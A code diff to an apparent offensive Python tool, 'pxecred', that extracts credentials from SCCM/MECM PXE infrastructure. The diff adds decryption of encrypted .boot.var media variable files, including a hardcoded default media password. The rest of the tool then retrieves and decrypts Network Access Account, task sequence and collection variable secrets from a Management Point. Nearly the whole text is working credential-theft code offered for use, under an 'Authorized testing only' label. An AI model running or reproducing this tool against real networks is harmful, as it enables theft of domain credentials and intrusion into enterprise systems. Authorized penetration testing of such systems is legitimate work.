@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
-"""pxecred — cross-platform SCCM/MECM PXE policy credential extractor.
+"""pxecred — cross-platform SCCM/MECM PXE media and policy credential extractor.
 
-Consumes a PXE media variables XML file and its media PFX, then retrieves
-Network Access Account, Task Sequence, and Collection Variable policies from
-a Configuration Manager Management Point and decrypts them without Windows
-CryptoAPI or win32crypt.
+Decrypts a PXE media variables file (.boot.var) with its media password, or
+reads an already-decrypted variables.xml, then retrieves Network Access Account,
+Task Sequence, and Collection Variable policies from a Configuration Manager
+Management Point and decrypts them without Windows CryptoAPI or win32crypt.
 
 Authorized testing only.
 """
@@ -29,12 +29,24 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.serialization import pkcs12
 from Crypto.Cipher import DES3
 
-__version__ = "1.0.0"
+__version__ = "1.1.0"
+
+DEFAULT_MEDIA_PASSWORD = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
 
 
 # ---------------------------------------------------------------------------
 # Input / output helpers
 # ---------------------------------------------------------------------------
+
+def load_variables_text(text):
+    root = parse_xml(text)
+    values = {}
+    for var in root.iter("var"):
+        name = var.attrib.get("name")
+        if name:
+            values[name] = var.text or ""
+    return values
+
 
 def load_variables(path: Path):
     raw = path.read_bytes()
@@ -47,13 +59,49 @@ def load_variables(path: Path):
             pass
     if text is None:
         raise SystemExit(f"Could not decode {path}")
-    root = parse_xml(text)
-    values = {}
-    for var in root.iter("var"):
-        name = var.attrib.get("name")
-        if name:
-            values[name] = var.text or ""
-    return values
+    return load_variables_text(text)
+
+
+# ---------------------------------------------------------------------------
+# Encrypted PXE media variables (.boot.var)
+# ---------------------------------------------------------------------------
+
+def decrypt_media_variables(boot_var: Path, password: str) -> str:
+    """Decrypt a PXE .boot.var file without Windows CryptoAPI.
+
+    PXE media variable files start with a 24-byte header and end with an
+    8-byte trailer. The remaining bytes are AES-128-CBC encrypted with a
+    zero IV. The key is Microsoft's CryptDeriveKey SHA-1 construction over
+    the UTF-16LE password.
+
+    This format and derivation match PXEThief's media_variable_file_cryptography
+    module (GPL-3.0).
+    """
+    raw = boot_var.read_bytes()
+    if len(raw) <= 32:
+        raise SystemExit(f"Media variables file is too small: {boot_var}")
+
+    encrypted = raw[24:-8]
+    if not encrypted:
+        raise SystemExit(f"No encrypted media variables data in {boot_var}")
+
+    key = aes_des_key_derivation(password.encode("utf-16-le"))
+    last_block = (len(encrypted) // 16) * 16
+    decryptor = Cipher(algorithms.AES(key[:16]), modes.CBC(b"\x00" * 16)).decryptor()
+    plaintext = decryptor.update(encrypted[:last_block]) + decryptor.finalize()
+    text = plaintext.decode("utf-16-le", errors="replace")
+
+    nul = text.rfind("\x00")
+    if nul != -1:
+        text = text[:nul]
+    text = "".join(c for c in text if c.isprintable())
+    if "_SMSMediaGuid" not in text:
+        raise SystemExit("Failed to decrypt media variables; check the password")
+    try:
+        load_variables_text(text)
+    except Exception as exc:
+        raise SystemExit(f"Decrypted media variables are not valid XML: {exc}")
+    return text
 
 
 def parse_xml(text):
@@ -435,9 +483,13 @@ def decrypt_content(data: bytes, key) -> bytes:
 def main():
     parser = argparse.ArgumentParser(
         prog="pxecred",
-        description="Cross-platform SCCM/MECM PXE policy credential extractor",
+        description="Cross-platform SCCM/MECM PXE media and policy credential extractor",
     )
-    parser.add_argument("--variables", default="variables.xml", help="PXE media variables XML")
+    parser.add_argument("--variables", help="PXE media variables XML (default: variables.xml if no --boot-var)")
+    parser.add_argument("--boot-var", metavar="PATH",
+                        help="Encrypted PXE media variables file (.boot.var); decrypt with --password")
+    parser.add_argument("--password", "--media-password", dest="media_password",
+                        help="Password for --boot-var (default: built-in MECM media password)")
     parser.add_argument("--pfx", help="Media PFX (default: extract from variables to media.pfx)")
     parser.add_argument("--pfx-password", help="PFX password (default: first 31 chars of _SMSMediaGuid)")
     parser.add_argument("--mp", help="Management Point base URL (default: SMSTSMP/SMSTSLocationMPs)")
@@ -449,16 +501,39 @@ def main():
     parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
     args = parser.parse_args()
 
-    variables_path = Path(args.variables).expanduser()
-    if not variables_path.is_file():
-        raise SystemExit(f"variables XML not found: {variables_path}")
-    values = load_variables(variables_path)
-    media_guid = values.get("_SMSMediaGuid", "").strip()
-    if not media_guid:
-        raise SystemExit("_SMSMediaGuid is missing from the media variables")
+    if args.boot_var and args.variables:
+        parser.error("use either --boot-var or --variables, not both")
+    if args.media_password and not args.boot_var:
+        parser.error("--password requires --boot-var")
 
     output = Path(args.output).expanduser()
     output.mkdir(parents=True, exist_ok=True)
+
+    if args.boot_var:
+        boot_var = Path(args.boot_var).expanduser()
+        if not boot_var.is_file():
+            raise SystemExit(f"media variables file not found: {boot_var}")
+        if args.media_password:
+            print("[+] Decrypting media variables with the supplied password")
+        else:
+            print("[+] No password supplied; using the built-in MECM media password")
+        variables_text = decrypt_media_variables(
+            boot_var, args.media_password or DEFAULT_MEDIA_PASSWORD
+        )
+        variables_path = output / "variables.xml"
+        variables_path.write_text(variables_text, encoding="utf-16")
+        print(f"[+] Decrypted media variables: {variables_path}")
+        values = load_variables_text(variables_text)
+    else:
+        variables_path = Path(args.variables or "variables.xml").expanduser()
+        if not variables_path.is_file():
+            raise SystemExit(f"variables XML not found: {variables_path}")
+        values = load_variables(variables_path)
+        print(f"[+] Variables: {variables_path}")
+
+    media_guid = values.get("_SMSMediaGuid", "").strip()
+    if not media_guid:
+        raise SystemExit("_SMSMediaGuid is missing from the media variables")
 
     if args.pfx:
         pfx_path = Path(args.pfx).expanduser()
